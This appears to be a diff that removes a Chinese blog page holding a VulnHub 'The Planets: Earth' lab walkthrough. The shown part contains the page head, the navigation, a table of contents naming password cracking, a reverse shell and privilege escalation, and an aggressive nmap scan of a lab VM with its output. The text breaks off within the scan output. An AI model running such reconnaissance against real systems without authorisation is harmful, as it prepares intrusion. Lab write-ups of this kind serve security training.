@@ -1,160 +1,1239 @@
-<!doctype html><html lang=zh dir=ltr><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="一、信息收集#1.1 端口信息收集#1┌──(kali㉿kali)-[~] 2└─$ sudo nmap -A -p- 192.168.174.133 3Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-12 02:51 EST 4Nmap scan report for 192.168.174.133 5Host is up (0.00068s latency). 6Not shown: 65373 filtered tcp ports (no-response), 159 filtered tcp ports (admin-prohibited) 7PORT STATE SERVICE VERSION 822/tcp open ssh OpenSSH 8.6 (protocol 2.0) 9| ssh-hostkey: 10| 256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA) 11|_ 256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519) 1280/tcp open http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9) 13|_http-title: Bad Request (400) 14|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9 15443/tcp open ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9) 16|_http-title: Test Page for the HTTP Server on Fedora 17| http-methods: 18|_ Potentially risky methods: TRACE 19| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space 20| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local 21| Not valid before: 2021-10-12T23:26:31 22|_Not valid after: 2031-10-10T23:26:31 23|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9 24| tls-alpn: 25|_ http/1.1 26|_ssl-date: TLS randomness does not represent time 27MAC Address: 00:0C:29:47:0F:CB (VMware) 28Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port 29Device type: general purpose|router|storage-misc 30Running (JUST GUESSING): Linux 4.X|5.X|6.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%), Synology DiskStation Manager 5.X (88%) 31OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:6.0 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/a:synology:diskstation_manager:5.2 32Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 4.19 (95%), OpenWrt 21.02 (Linux 5.4) (95%), Linux 6.0 (95%), Linux 5.4 - 5.10 (91%), Linux 2.6.32 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%) 33No exact OS matches for host (test conditions non-ideal). 34Network Distance: 1 hop 35 36TRACEROUTE 37HOP RTT ADDRESS 381 0.68 ms 192.168.174.133 39 40OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 41Nmap done: 1 IP address (1 host up) scanned in 174.28 seconds在443/tcp端口的ssl-cert部分发现域名信息，说明该ip在http服务中配置了两个域名：
-"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="http://localhost:1313/docs/cybersecurity/vulnhub/easy/vulnhub-the-planets_earth/"><meta property="og:site_name" content="vnccer"><meta property="og:title" content="The planets earth"><meta property="og:description" content="一、信息收集#1.1 端口信息收集#1┌──(kali㉿kali)-[~] 2└─$ sudo nmap -A -p- 192.168.174.133 3Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-12 02:51 EST 4Nmap scan report for 192.168.174.133 5Host is up (0.00068s latency). 6Not shown: 65373 filtered tcp ports (no-response), 159 filtered tcp ports (admin-prohibited) 7PORT STATE SERVICE VERSION 822/tcp open ssh OpenSSH 8.6 (protocol 2.0) 9| ssh-hostkey: 10| 256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA) 11|_ 256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519) 1280/tcp open http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9) 13|_http-title: Bad Request (400) 14|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9 15443/tcp open ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9) 16|_http-title: Test Page for the HTTP Server on Fedora 17| http-methods: 18|_ Potentially risky methods: TRACE 19| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space 20| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local 21| Not valid before: 2021-10-12T23:26:31 22|_Not valid after: 2031-10-10T23:26:31 23|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9 24| tls-alpn: 25|_ http/1.1 26|_ssl-date: TLS randomness does not represent time 27MAC Address: 00:0C:29:47:0F:CB (VMware) 28Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port 29Device type: general purpose|router|storage-misc 30Running (JUST GUESSING): Linux 4.X|5.X|6.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%), Synology DiskStation Manager 5.X (88%) 31OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:6.0 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/a:synology:diskstation_manager:5.2 32Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 4.19 (95%), OpenWrt 21.02 (Linux 5.4) (95%), Linux 6.0 (95%), Linux 5.4 - 5.10 (91%), Linux 2.6.32 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%) 33No exact OS matches for host (test conditions non-ideal). 34Network Distance: 1 hop 35 36TRACEROUTE 37HOP RTT ADDRESS 381 0.68 ms 192.168.174.133 39 40OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 41Nmap done: 1 IP address (1 host up) scanned in 174.28 seconds在443/tcp端口的ssl-cert部分发现域名信息，说明该ip在http服务中配置了两个域名："><meta property="og:locale" content="zh"><meta property="og:type" content="article"><meta property="article:section" content="docs"><meta property="article:published_time" content="2026-03-11T00:00:00+00:00"><meta property="article:modified_time" content="2026-03-11T22:27:33+08:00"><meta itemprop=name content="The planets earth"><meta itemprop=description content="一、信息收集#1.1 端口信息收集#1┌──(kali㉿kali)-[~] 2└─$ sudo nmap -A -p- 192.168.174.133 3Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-12 02:51 EST 4Nmap scan report for 192.168.174.133 5Host is up (0.00068s latency). 6Not shown: 65373 filtered tcp ports (no-response), 159 filtered tcp ports (admin-prohibited) 7PORT STATE SERVICE VERSION 822/tcp open ssh OpenSSH 8.6 (protocol 2.0) 9| ssh-hostkey: 10| 256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA) 11|_ 256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519) 1280/tcp open http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9) 13|_http-title: Bad Request (400) 14|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9 15443/tcp open ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9) 16|_http-title: Test Page for the HTTP Server on Fedora 17| http-methods: 18|_ Potentially risky methods: TRACE 19| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space 20| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local 21| Not valid before: 2021-10-12T23:26:31 22|_Not valid after: 2031-10-10T23:26:31 23|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9 24| tls-alpn: 25|_ http/1.1 26|_ssl-date: TLS randomness does not represent time 27MAC Address: 00:0C:29:47:0F:CB (VMware) 28Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port 29Device type: general purpose|router|storage-misc 30Running (JUST GUESSING): Linux 4.X|5.X|6.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%), Synology DiskStation Manager 5.X (88%) 31OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:6.0 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/a:synology:diskstation_manager:5.2 32Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 4.19 (95%), OpenWrt 21.02 (Linux 5.4) (95%), Linux 6.0 (95%), Linux 5.4 - 5.10 (91%), Linux 2.6.32 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%) 33No exact OS matches for host (test conditions non-ideal). 34Network Distance: 1 hop 35 36TRACEROUTE 37HOP RTT ADDRESS 381 0.68 ms 192.168.174.133 39 40OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 41Nmap done: 1 IP address (1 host up) scanned in 174.28 seconds在443/tcp端口的ssl-cert部分发现域名信息，说明该ip在http服务中配置了两个域名："><meta itemprop=datePublished content="2026-03-11T00:00:00+00:00"><meta itemprop=dateModified content="2026-03-11T22:27:33+08:00"><meta itemprop=wordCount content="887"><title>The planets earth | vnccer</title><link rel=icon href=/AK47.png><link rel=manifest href=/manifest.json><link rel=canonical href=http://localhost:1313/docs/cybersecurity/vulnhub/easy/vulnhub-the-planets_earth/><link rel=stylesheet href=/book.min.326841005b40561605b2115d01f6c968310c7418136629028362d36e053c379d.css integrity="sha256-MmhBAFtAVhYFshFdAfbJaDEMdBgTZikCg2LTbgU8N50=" crossorigin=anonymous><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css><script defer src=/fuse.min.js></script><script defer src=/zh.search.min.66c1db10d16485077a36978ecae911247f7957b6d1fac2f37e4d0f3122855ee3.js integrity="sha256-ZsHbENFkhQd6NpeOyukRJH95V7bR+sLzfk0PMSKFXuM=" crossorigin=anonymous></script><script>(function(){localStorage.getItem("sidebar-collapsed")==="true"&&document.documentElement.classList.add("sidebar-collapsed-init")})()</script></head><body dir=ltr class="book-kind-page book-type-docs"><input type=checkbox class="hidden toggle" id=menu-control>
-<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><img src=/flamez.png alt=Logo><span>vnccer</span></a></h2><div class="book-search hidden"><input id=book-search-input type=text placeholder=搜索 aria-label=搜索 maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><a href=/docs/>🏠 返回主页</a></li></ul><button class=sidebar-toggle onclick=toggleSidebar() aria-label="Toggle Sidebar">
-<i class="fas fa-angle-left"></i></button><ul><li><input type=checkbox id=section-4812594788d2c7059bd80232c02af0d6 class=toggle checked>
-<label for=section-4812594788d2c7059bd80232c02af0d6 class=flex><a href=/docs/cybersecurity/><span style=display:inline-flex;align-items:center;gap:8px><span>🛡️</span><span>网安</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><input type=checkbox id=section-4b8026b2ef91fed29957b6dd552f3cd1 class=toggle>
-<label for=section-4b8026b2ef91fed29957b6dd552f3cd1 class=flex><a href=/docs/cybersecurity/dvwa/><span style=display:inline-flex;align-items:center;gap:8px><span>DVWA</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/dvwa/dvwa/><span style=display:inline-flex;align-items:center;gap:8px><span>DVWA全难度</span></span></a></li></ul></li><li><input type=checkbox id=section-33d66818bfeced9ba6f59416de59c638 class=toggle>
-<label for=section-33d66818bfeced9ba6f59416de59c638 class=flex><a href=/docs/cybersecurity/vulnerabilities/><span style=display:inline-flex;align-items:center;gap:8px><span>vulnerabilities</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/vulnerabilities/apache-log4j2cve-2021-44228%E5%A4%B1%E8%B4%A5%E5%B0%9D%E8%AF%95/><span style=display:inline-flex;align-items:center;gap:8px><span>基于docker的log4j2（CVE-2021-44228）漏洞（失败）</span></span></a></li></ul></li><li><input type=checkbox id=section-1061c6c3a619113d31feeef8b55aa0af class=toggle checked>
-<label for=section-1061c6c3a619113d31feeef8b55aa0af class=flex><a href=/docs/cybersecurity/vulnhub/><span style=display:inline-flex;align-items:center;gap:8px><span>VULNHUB</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><input type=checkbox id=section-d6fb052e486182e9d950efd6bdcd7544 class=toggle checked>
-<label for=section-d6fb052e486182e9d950efd6bdcd7544 class=flex><a role=button><span style=display:inline-flex;align-items:center;gap:8px><span>easy</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub-beelzebub_1/><span style=display:inline-flex;align-items:center;gap:8px><span>Beelzebub: 1</span></span></a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub-empire_breakout/><span style=display:inline-flex;align-items:center;gap:8px><span>Empire Breakout</span></span></a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub-ica_1/><span style=display:inline-flex;align-items:center;gap:8px><span>ICA: 1</span></span></a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub-jangow_1.0.1/><span style=display:inline-flex;align-items:center;gap:8px><span>jangow 1.0.1</span></span></a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub-napping-1.0.1/><span style=display:inline-flex;align-items:center;gap:8px><span>Napping: 1.0.1</span></span></a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub-noob_1/><span style=display:inline-flex;align-items:center;gap:8px><span>Noob: 1</span></span></a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub-the-planets_earth/ class=active><span style=display:inline-flex;align-items:center;gap:8px><span>The planets earth</span></span></a></li></ul></li><li><input type=checkbox id=section-217a33c9ab6cb7480b66e6fc3c901104 class=toggle>
-<label for=section-217a33c9ab6cb7480b66e6fc3c901104 class=flex><a role=button><span style=display:inline-flex;align-items:center;gap:8px><span>medium</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/vulnhub/medium/vulnhub-empire_lupinone/><span style=display:inline-flex;align-items:center;gap:8px><span>Empire lupinone</span></span></a></li></ul></li><li><input type=checkbox id=section-90b87787f24b7d37429e1cd5b0528c96 class=toggle>
-<label for=section-90b87787f24b7d37429e1cd5b0528c96 class=flex><a role=button><span style=display:inline-flex;align-items:center;gap:8px><span>hard</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul></ul></li></ul></li><li><input type=checkbox id=section-e39c1a654e59f621dd1360f7f30a45b5 class=toggle>
-<label for=section-e39c1a654e59f621dd1360f7f30a45b5 class=flex><a href=/docs/cybersecurity/ctf/><span style=display:inline-flex;align-items:center;gap:8px><span>CTF</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><input type=checkbox id=section-0487c019683c53bd5946a574af947fcd class=toggle>
-<label for=section-0487c019683c53bd5946a574af947fcd class=flex><a role=button><span style=display:inline-flex;align-items:center;gap:8px><span>easy</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/ctf/easy/ctf-web-low/><span style=display:inline-flex;align-items:center;gap:8px><span>web-low</span></span></a></li></ul></li><li><input type=checkbox id=section-449a2c3b61b7512315c644ea5feb5715 class=toggle>
-<label for=section-449a2c3b61b7512315c644ea5feb5715 class=flex><a role=button><span style=display:inline-flex;align-items:center;gap:8px><span>medium</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul></ul></li><li><input type=checkbox id=section-011df73066cb46bd9a3b70d7ab49a0ab class=toggle>
-<label for=section-011df73066cb46bd9a3b70d7ab49a0ab class=flex><a role=button><span style=display:inline-flex;align-items:center;gap:8px><span>hard</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul></ul></li></ul></li></ul></li><li><input type=checkbox id=section-7aec202ce54c41749fd44d4107024bd0 class=toggle>
-<label for=section-7aec202ce54c41749fd44d4107024bd0 class=flex><a href=/docs/papers/><span style=display:inline-flex;align-items:center;gap:8px><span>📄</span><span>论文</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><input type=checkbox id=section-0b5f6bcc8205d8c69a48df615a80be2c class=toggle>
-<label for=section-0b5f6bcc8205d8c69a48df615a80be2c class=flex><a href=/docs/papers/et-bert/et-bert/><span style=display:inline-flex;align-items:center;gap:8px><span>ET-BERT</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label></li><li><input type=checkbox id=section-ff28b038514d9b4fa29796997b003b8a class=toggle>
-<label for=section-ff28b038514d9b4fa29796997b003b8a class=flex><a href=/docs/papers/et-bert/et-bert%E5%A4%8D%E7%8E%B0/><span style=display:inline-flex;align-items:center;gap:8px><span>ET-BERT复现</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label></li></ul></li><li><input type=checkbox id=section-601151e093f781f3949570b4dccefe4b class=toggle>
-<label for=section-601151e093f781f3949570b4dccefe4b class=flex><a href=/docs/work/><span style=display:inline-flex;align-items:center;gap:8px><span>💼</span><span>未来</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/work/n/><span style=display:inline-flex;align-items:center;gap:8px><span>N</span></span></a></li></ul></li><li><input type=checkbox id=section-114786bd93b83846332283540536c052 class=toggle>
-<label for=section-114786bd93b83846332283540536c052 class=flex><a href=/docs/ai/><span style=display:inline-flex;align-items:center;gap:8px><span>🤖</span><span>AI</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul></ul></li><li><input type=checkbox id=section-1b825241e23f5ffe0a3e34d4481bfcee class=toggle>
-<label for=section-1b825241e23f5ffe0a3e34d4481bfcee class=flex><a href=/docs/skills/><span style=display:inline-flex;align-items:center;gap:8px><span>🛠️</span><span>技能</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/skills/anaconda%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/><span style=display:inline-flex;align-items:center;gap:8px><span>anaconda环境配置</span></span></a></li><li><a href=/docs/skills/kali-linux/><span style=display:inline-flex;align-items:center;gap:8px><span>kali linux基础</span></span></a></li><li><a href=/docs/skills/switchyomega-mv3%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/><span style=display:inline-flex;align-items:center;gap:8px><span>SwitchyOmega mv3操作记录</span></span></a></li><li><a href=/docs/skills/win-+-r%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/><span style=display:inline-flex;align-items:center;gap:8px><span>win + r常用指令</span></span></a></li><li><a href=/docs/skills/%E5%9F%BA%E4%BA%8Evmware%E7%9A%84kali-linux%E4%B8%8B%E7%9A%84docker%E9%83%A8%E7%BD%B2%E5%9D%91%E5%A4%9A/><span style=display:inline-flex;align-items:center;gap:8px><span>基于vmware的kali linux下的docker部署(坑多)</span></span></a></li><li><a href=/docs/skills/%E7%BD%91%E7%AB%99%E6%9E%84%E5%BB%BA/><span style=display:inline-flex;align-items:center;gap:8px><span>网站构建</span></span></a></li></ul></li><li><input type=checkbox id=section-f61a54d247f538b8e499d8d6a63dd0af class=toggle>
-<label for=section-f61a54d247f538b8e499d8d6a63dd0af class=flex><a href=/docs/life/><span style=display:inline-flex;align-items:center;gap:8px><span>☕</span><span>生活</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul></ul></li><li><input type=checkbox id=section-5fcfcafd77cf38869672166f51c04c8e class=toggle>
-<label for=section-5fcfcafd77cf38869672166f51c04c8e class=flex><a href=/docs/navigator/><span style=display:inline-flex;align-items:center;gap:8px><i class="fa-solid fa-compass" style=width:1.25em;text-align:center></i><span>网站导航</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/navigator/n_cyber-range/><span style=display:inline-flex;align-items:center;gap:8px><i class="fa-solid fa-bolt-lightning" style=width:1.25em;text-align:center></i><span>打靶</span></span></a><ul></ul></li><li><a href=/docs/navigator/n_papers/><span style=display:inline-flex;align-items:center;gap:8px><span>📃</span><span>论文</span></span></a><ul></ul></li><li><a href=/docs/navigator/n_work/><span style=display:inline-flex;align-items:center;gap:8px><i class="fa-solid fa-briefcase" style=width:1.25em;text-align:center></i><span>工作</span></span></a><ul></ul></li><li><a href=/docs/navigator/n_ai/><span style=display:inline-flex;align-items:center;gap:8px><i class="fa-solid fa-robot" style=width:1.25em;text-align:center></i><span>AI</span></span></a><ul></ul></li><li><a href=/docs/navigator/n_function/><span style=display:inline-flex;align-items:center;gap:8px><i class="fa-solid fa-gears" style=width:1.25em;text-align:center></i><span>Function</span></span></a><ul></ul></li><li><a href=/docs/navigator/n_life/><span style=display:inline-flex;align-items:center;gap:8px><i class="fa-solid fa-gamepad" style=width:1.25em;text-align:center></i><span>Life</span></span></a><ul></ul></li><li><a href=/docs/navigator/n_forum/><span style=display:inline-flex;align-items:center;gap:8px><i class="fa-solid fa-hippo" style=width:1.25em;text-align:center></i><span>平台</span></span></a><ul></ul></li><li><a href=/docs/navigator/n_airport/><span style=display:inline-flex;align-items:center;gap:8px><i class="fa-solid fa-plane" style=width:1.25em;text-align:center></i><span>机场</span></span></a><ul></ul></li></ul></li></ul><button class=sidebar-toggle onclick=toggleSidebar() aria-label="Toggle Sidebar">
-<i class="fas fa-angle-left"></i></button></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class="book-header hidden"><div class="flex align-center justify-between"><label for=menu-control><img src=/icons/menu.svg class=book-icon alt=Menu></label><h3>The planets earth</h3><label for=toc-control><img src=/icons/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class=hidden><nav id=TableOfContents><ul><li><a href=#一信息收集>一、信息收集</a><ul><li><a href=#11-端口信息收集>1.1 端口信息收集</a></li><li><a href=#12-web信息收集>1.2 Web信息收集</a><ul><li><a href=#121-域名earthlocal>1.2.1 域名earth.local</a></li><li><a href=#122-子域名terratestearthlocal>1.2.2 子域名terratest.earth.local</a></li></ul></li></ul></li><li><a href=#二漏洞攻击>二、漏洞攻击</a><ul><li><a href=#21-密码破解>2.1 密码破解</a></li><li><a href=#22-获取user_flag>2.2 获取user_flag</a></li><li><a href=#23-反弹shell>2.3 反弹shell</a></li></ul></li><li><a href=#三提权>三、提权</a><ul><li><a href=#31-查找可提权命令>3.1 查找可提权命令</a></li><li><a href=#32-reset_root分析>3.2 reset_root分析</a></li></ul></li><li><a href=#四总结>四、总结</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=一信息收集>一、信息收集<a class=anchor href=#%e4%b8%80%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86>#</a></h1><h2 id=11-端口信息收集>1.1 端口信息收集<a class=anchor href=#11-%e7%ab%af%e5%8f%a3%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86>#</a></h2><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-zsh data-lang=zsh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 1</span><span>┌──<span style=color:#ff7b72;font-weight:700>(</span>kali㉿kali<span style=color:#ff7b72;font-weight:700>)</span>-<span style=color:#ff7b72;font-weight:700>[</span>~<span style=color:#ff7b72;font-weight:700>]</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 2</span><span>└─$ sudo nmap -A -p- 192.168.174.133 
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 3</span><span>Starting Nmap 7.95 <span style=color:#ff7b72;font-weight:700>(</span> https://nmap.org <span style=color:#ff7b72;font-weight:700>)</span> at 2026-02-12 02:51 EST
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 4</span><span>Nmap scan report <span style=color:#ff7b72>for</span> 192.168.174.133
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 5</span><span>Host is up <span style=color:#ff7b72;font-weight:700>(</span>0.00068s latency<span style=color:#ff7b72;font-weight:700>)</span>.
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 6</span><span>Not shown: <span style=color:#a5d6ff>65373</span> filtered tcp ports <span style=color:#ff7b72;font-weight:700>(</span>no-response<span style=color:#ff7b72;font-weight:700>)</span>, <span style=color:#a5d6ff>159</span> filtered tcp ports <span style=color:#ff7b72;font-weight:700>(</span>admin-prohibited<span style=color:#ff7b72;font-weight:700>)</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 7</span><span>PORT    STATE SERVICE  VERSION
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 8</span><span>22/tcp  open  ssh      OpenSSH 8.6 <span style=color:#ff7b72;font-weight:700>(</span>protocol 2.0<span style=color:#ff7b72;font-weight:700>)</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 9</span><span>| ssh-hostkey: 
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">10</span><span>|   <span style=color:#a5d6ff>256</span> 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 <span style=color:#ff7b72;font-weight:700>(</span>ECDSA<span style=color:#ff7b72;font-weight:700>)</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">11</span><span>|_  <span style=color:#a5d6ff>256</span> b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 <span style=color:#ff7b72;font-weight:700>(</span>ED25519<span style=color:#ff7b72;font-weight:700>)</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">12</span><span>80/tcp  open  http     Apache httpd 2.4.51 <span style=color:#ff7b72;font-weight:700>((</span>Fedora<span style=color:#ff7b72;font-weight:700>)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9<span style=color:#ff7b72;font-weight:700>)</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">13</span><span>|_http-title: Bad Request <span style=color:#ff7b72;font-weight:700>(</span>400<span style=color:#ff7b72;font-weight:700>)</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">14</span><span>|_http-server-header: Apache/2.4.51 <span style=color:#ff7b72;font-weight:700>(</span>Fedora<span style=color:#ff7b72;font-weight:700>)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">15</span><span>443/tcp open  ssl/http Apache httpd 2.4.51 <span style=color:#ff7b72;font-weight:700>((</span>Fedora<span style=color:#ff7b72;font-weight:700>)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9<span style=color:#ff7b72;font-weight:700>)</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">16</span><span>|_http-title: Test Page <span style=color:#ff7b72>for</span> the HTTP Server on Fedora
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">17</span><span>| http-methods: 
